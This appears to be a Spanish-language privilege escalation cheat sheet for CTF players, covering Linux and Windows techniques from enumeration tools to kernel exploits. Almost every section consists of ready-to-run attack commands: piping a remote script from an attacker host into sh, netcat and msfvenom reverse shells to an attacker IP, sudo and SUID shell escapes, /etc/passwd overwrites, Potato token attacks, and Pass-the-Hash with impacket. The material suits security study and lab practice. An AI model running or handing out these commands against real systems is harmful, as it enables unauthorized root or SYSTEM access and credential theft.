01 Herramientas automáticas
automático
LinPEAS (Linux)
linuxautomático
Script de enumeración exhaustiva para Linux. Colorea los hallazgos por criticidad — el amarillo/rojo indica vectores de escalada probables.
El punto de partida en casi cualquier CTF Linux. En 2-3 minutos tienes un mapa completo de la superficie de ataque: SUID, sudo, cron, capabilities, contraseñas en archivos…
descarga y ejecución
# Desde tu máquina — servir el script python3 -m http.server 8080 # En el target — descargar y ejecutar en memoria curl http://<tu_ip>:8080/linpeas.sh | sh # O descargar, dar permisos y ejecutar wget http://<tu_ip>:8080/linpeas.sh -O /tmp/lp.sh chmod +x /tmp/lp.sh && /tmp/lp.sh # Guardar output para analizar con calma /tmp/lp.sh | tee /tmp/linpeas_out.txt
WinPEAS (Windows)
windowsautomático
Equivalente de LinPEAS para Windows. Enumera servicios, registro, credenciales almacenadas, tokens, scheduled tasks, rutas no entrecomilladas y mucho más.
Imprescindible en CTFs Windows. Fíjate especialmente en lo que marca en rojo — AlwaysInstallElevated, rutas sin comillas, servicios modificables, credenciales en texto plano.
descarga y ejecución
# Descargar desde tu servidor HTTP certutil -urlcache -f http://<tu_ip>:8080/winPEASx64.exe C:\Temp\wp.exe C:\Temp\wp.exe # PowerShell — si certutil está bloqueado IWR http://<tu_ip>:8080/winPEASx64.exe -OutFile C:\Temp\wp.exe; C:\Temp\wp.exe # Guardar output C:\Temp\wp.exe > C:\Temp\out.txt 2>&1

linuxautomático
Alternativa más ordenada a LinPEAS. Presenta hallazgos por niveles de criticidad y es más fácil de leer en terminales pequeñas.
ejecución por niveles
# Nivel 0 — solo lo más crítico (rápido) ./lse.sh -l 0 # Nivel 1 — interesante (recomendado) ./lse.sh -l 1 # Nivel 2 — exhaustivo ./lse.sh -l 2

01 Sudo misconfigurations
linux
sudo -l — el primer comando siempre
Muestra qué comandos puede ejecutar el usuario actual con sudo, y si requieren contraseña o no.
Es el vector más rápido y frecuente en CTFs. Si puedes ejecutar ANY como root, o un binario interpretado (python, vim, find…), hay escalada directa. Consulta GTFOBins para cada binario.
interpretar el output
# Output ejemplo: (ALL : ALL) NOPASSWD: /usr/bin/python3 # → puede ejecutar python3 como root sin contraseña → escalada directa (root) NOPASSWD: /usr/bin/find # → GTFOBins: sudo find . -exec /bin/bash \; -quit (ALL) ALL # → puede ejecutar cualquier cosa → sudo su o sudo bash
escalada con binarios comunes vía sudo
# python / python3 sudo python3 -c 'import os; os.system("/bin/bash")' # vim sudo vim -c ':!/bin/bash' # less / more sudo less /etc/passwd !/bin/bash # dentro de less, escribir esto # find sudo find . -exec /bin/bash \; -quit # awk sudo awk 'BEGIN {system("/bin/bash")}' # nano sudo nano # Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0
sudo con wildcards o rutas relativas
linux
A veces sudo permite un script específico pero ese script usa rutas relativas o wildcards — se puede abusar del PATH o del wildcard para inyectar comandos.
PATH hijacking
# Si el script permitido hace: cd /tmp && backup.sh # y backup.sh llama a "tar" sin ruta absoluta: echo '/bin/bash' > /tmp/tar chmod +x /tmp/tar export PATH=/tmp:$PATH sudo /usr/local/bin/backup.sh # ejecuta nuestro 'tar' falso como root
wildcard injection (tar)
# Si cron o sudo ejecuta: tar czf backup.tgz /opt/* # El wildcard * expande a nombres de archivo — algunos son flags de tar echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /opt/shell.sh chmod +x /opt/shell.sh touch /opt/--checkpoint=1 touch /opt/--checkpoint-action=exec=sh\ shell.sh # Cuando tar expande *, los archivos actúan como flags /tmp/rootbash -p # shell con SUID de root
02 Binarios SUID
linuxgtfobins
Encontrar y explotar SUID
Un binario con el bit SUID activado se ejecuta con los permisos de su propietario (normalmente root), independientemente de quién lo lance.
Si find, bash, python, cp o cualquier intérprete tiene SUID de root, hay escalada directa. Siempre cruzar con GTFOBins.
encontrar SUID
find / -perm -4000 -type f 2>/dev/null find / -perm -u=s -type f 2>/dev/null # Filtrar solo los no estándar (los peligrosos) find / -perm -4000 -type f 2>/dev/null | grep -v -E '/bin/|/sbin/|/usr/bin/|/usr/sbin/'
explotación de SUID comunes
# bash con SUID → -p preserva privilegios efectivos /bin/bash -p # find con SUID find . -exec /bin/sh -p \; -quit # cp con SUID → copiar /etc/shadow para crackear cp /etc/shadow /tmp/shadow_copy # O sobreescribir /etc/passwd con usuario root personalizado openssl passwd -1 -salt xyz hacked123 # genera hash echo 'hacked:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd # python con SUID python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")' # vim con SUID vim.tiny -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
03 Cron jobs
linux
Scripts de cron modificables o con rutas relativas
Si root ejecuta un script periódicamente vía cron y ese script es escribible por nuestro usuario, podemos inyectar comandos que se ejecutarán como root.
Muy frecuente en CTFs. La clave es encontrar scripts que root ejecuta automáticamente y que nosotros podemos modificar, o que usan rutas relativas que podemos secuestrar con PATH.
localizar cron jobs
cat /etc/crontab cat /etc/cron.d/* ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly crontab -l # crons del usuario actual crontab -l -u root 2>/dev/null # crons de root (si hay permisos) # Monitorizar procesos nuevos en tiempo real (detectar crons) watch -n 1 "ps aux | grep root" # pspy — sin root, monitoriza procesos y crons ./pspy64
explotar script modificable
# Verificar permisos del script que ejecuta root ls -la /opt/cleanup.sh # Si somos el propietario o tiene write para todos → inyectar echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/cleanup.sh # Esperar a que cron lo ejecute, luego: /tmp/rootbash -p
04 Capabilities
linux
Linux capabilities — alternativa granular a SUID
Las capabilities dan privilegios específicos a binarios sin otorgar root completo. Algunas como cap_setuid o cap_sys_admin permiten escalada directa.
Menos conocidas que SUID pero igual de peligrosas. LinPEAS las detecta, pero es bueno saber buscarlas manualmente.
encontrar y explotar capabilities
getcap -r / 2>/dev/null # Ejemplo de output peligroso: /usr/bin/python3.8 = cap_setuid+ep # cap_setuid → puede cambiar su UID a 0 (root) python3 -c 'import os; os.setuid(0); os.system("/bin/bash")' # cap_net_raw → puede sniffar tráfico (tcpdump sin root) # cap_sys_admin → muy amplio, casi equivale a root # perl con cap_setuid perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
05 Kernel exploits
linuxkernel
Explotar vulnerabilidades del kernel Linux
kernel
Último recurso cuando no hay otros vectores. Exploits como Dirty COW, Dirty Pipe o PwnKit que elevan privilegios abusando del kernel.
En CTFs aparece en máquinas antiguas sin parchear. Identifica el kernel con uname -a y busca CVEs específicos. Cuidado: los kernel exploits pueden crashear el sistema.
identificar y buscar exploits
uname -a # versión exacta del kernel cat /proc/version # Buscar exploits conocidos con linux-exploit-suggester ./linux-exploit-suggester.sh ./linux-exploit-suggester.sh --uname "Linux 4.4.0-116-generic"
exploits clave por versión
# Dirty COW — CVE-2016-5195 (kernel < 4.8.3) # Sobrescribe /etc/passwd mediante race condition gcc -pthread dirty.c -o dirty -lcrypt ./dirty nuevapassword su firefart # usuario root con la nueva password # Dirty Pipe — CVE-2022-0847 (kernel 5.8 – 5.16.11) gcc dirtypipe.c -o dirtypipe ./dirtypipe /etc/passwd 1 'root::0:0:root:/root:/bin/bash' su root # sin contraseña # PwnKit — CVE-2021-4034 (pkexec, casi universal) make && ./pwnkit # shell root
06 NFS con no_root_squash
linux
Montar NFS y abusar de permisos root
Si un share NFS tiene la opción no_root_squash, el root de la máquina cliente tiene root efectivo en ese share — puede crear binarios SUID.
desde tu máquina atacante (root)
# Ver exports NFS del target showmount -e <target_ip> # Montar el share mkdir /tmp/nfs mount -o rw,vers=3 <target_ip>:/share /tmp/nfs # Crear binario SUID como root local cp /bin/bash /tmp/nfs/rootbash chmod +s /tmp/nfs/rootbash # En el target (usuario sin privilegios) /share/rootbash -p # shell de root
01 Token Impersonation
windows
SeImpersonatePrivilege — Potato attacks
windows
Si el usuario tiene el privilegio SeImpersonatePrivilege (muy común en cuentas de servicio IIS, SQL Server…), puede impersonar tokens de otros usuarios incluyendo SYSTEM.
El vector más frecuente en CTFs Windows de nivel medio-alto. Si whoami /priv muestra SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege, hay escalada casi garantizada.
verificar privilegio
whoami /priv # Buscar en el output: SeImpersonatePrivilege Impersonate a client after authentication Enabled
GodPotato (recomendado — funciona en Windows 10/2019+)
# Ejecutar comando como SYSTEM GodPotato.exe -cmd "cmd /c whoami" # Reverse shell como SYSTEM GodPotato.exe -cmd "cmd /c C:\Temp\nc.exe <tu_ip> 4444 -e cmd.exe"
PrintSpoofer (Windows 10 / Server 2019)
PrintSpoofer.exe -i -c cmd PrintSpoofer.exe -c "nc.exe <tu_ip> 4444 -e cmd"
JuicyPotato (Windows < 10 / Server 2016)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe ^ -a "/c nc.exe <tu_ip> 4444 -e cmd.exe" -t * -c {CLSID} # Lista de CLSIDs: https://github.com/ohpe/juicy-potato/tree/master/CLSID
02 Unquoted Service Paths
windows
Rutas de servicio sin entrecomillar
Si la ruta de un servicio tiene espacios y no está entre comillas, Windows prueba a ejecutar cada segmento como binario. Se puede colocar un ejecutable malicioso en una ruta anterior.
Misconfiguration clásica de Windows. WinPEAS lo detecta automáticamente, pero saber buscarlo manualmente es esencial.
encontrar rutas vulnerables
# Buscar servicios con rutas sin comillas y con espacios wmic service get name,startname,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """ # PowerShell — más limpio Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | Select Name, PathName, StartName
explotar
# Ruta vulnerable ejemplo: C:\Program Files\My Service\bin\service.exe # Windows intentará ejecutar en orden: C:\Program.exe C:\Program Files\My.exe C:\Program Files\My Service\bin\service.exe # Colocar payload en la ruta que podamos escribir msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o "My.exe" # Copiar a C:\Program Files\My.exe y reiniciar el servicio sc stop VulnService && sc start VulnService
03 AlwaysInstallElevated
windows
Instalar MSI como SYSTEM
Si dos claves de registro están a 1, cualquier usuario puede instalar paquetes MSI con privilegios de SYSTEM.
verificar
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # Si ambas devuelven 0x1 → vulnerable
explotar
# Generar payload MSI msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f msi -o evil.msi # Ejecutar en el target msiexec /quiet /qn /i C:\Temp\evil.msi
04 Weak Service Permissions
windows
Modificar binario o configuración de servicio
Si tenemos permisos de escritura sobre el ejecutable de un servicio que corre como SYSTEM, o podemos cambiar su configuración, podemos redirigirlo a nuestro payload.
con accesschk (Sysinternals)
# Servicios modificables por nuestro usuario accesschk.exe -uwcqv "%username%" * /accepteula accesschk.exe -uwcqv "Everyone" * /accepteula accesschk.exe -uwcqv "Users" * /accepteula # Cambiar el binario del servicio sc config VulnSvc binpath= "C:\Temp\nc.exe <ip> 4444 -e cmd.exe" sc stop VulnSvc && sc start VulnSvc

★ flujo completo de privilege escalation — Linux
// 1 — reconocimiento inmediato (manual, 2 min)
id && sudo -l && uname -a find / -perm -4000 -type f 2>/dev/null getcap -r / 2>/dev/null cat /etc/crontab && ls /etc/cron.d/
Prioridad: sudo -l primero. Si hay binario explotable → GTFOBins. Si no, continuar.
// 2 — herramienta automática
# Servir linpeas desde tu máquina python3 -m http.server 8080 # En el target curl http://<tu_ip>:8080/linpeas.sh | sh 2>&1 | tee /tmp/lp.txt
Analizar output: rojo/amarillo primero. Buscar: sudo, SUID, cron, contraseñas, capabilities, escritura en rutas de servicio.
// 3 — pspy si hay cron jobs sospechosos
./pspy64 # Observar procesos lanzados por UID=0 (root) # Identificar scripts periódicos que podamos modificar
pspy no necesita privilegios y monitoriza procesos en tiempo real. Indispensable para detectar cron jobs ocultos.
// 4 — si el kernel es antiguo
uname -r ./linux-exploit-suggester.sh # Evaluar: Dirty COW (4.x), Dirty Pipe (5.8–5.16), PwnKit (cualquiera con pkexec)
Último recurso — los kernel exploits pueden ser inestables. Probar primero en una copia del entorno si es posible.
★ flujo completo de privilege escalation — Windows
// 1 — reconocimiento inmediato
whoami /all # ¿SeImpersonatePrivilege? → GodPotato / PrintSpoofer systeminfo | findstr /B /C:"OS" /C:"Hotfix" wmic service get name,pathname | findstr /i /v "C:\Windows\\"
SeImpersonatePrivilege es el vector más frecuente en cuentas de servicio. Si está presente, hay escalada casi garantizada.
// 2 — herramienta automática
certutil -urlcache -f http://<tu_ip>:8080/winPEASx64.exe C:\Temp\wp.exe C:\Temp\wp.exe 2>&1 | more
Buscar en rojo: AlwaysInstallElevated, unquoted paths, servicios modificables, credenciales en texto plano.
// 3 — credenciales almacenadas
cmdkey /list # Si hay credenciales guardadas → runas con ellas runas /savecred /user:administrator "C:\Temp\nc.exe <ip> 4444 -e cmd"
cmdkey /list muestra credenciales guardadas en el gestor de Windows. Si hay una de admin, runas /savecred las usa sin pedir password.
// 4 — Pass the Hash si tenemos hashes NTLM
# Desde tu máquina Linux con impacket impacket-psexec administrator@<target_ip> -hashes :<NTLM_hash> impacket-wmiexec administrator@<target_ip> -hashes :<NTLM_hash>
No necesitas la contraseña en texto plano — el hash NTLM autentica directamente en protocolos Windows (SMB, WMI).
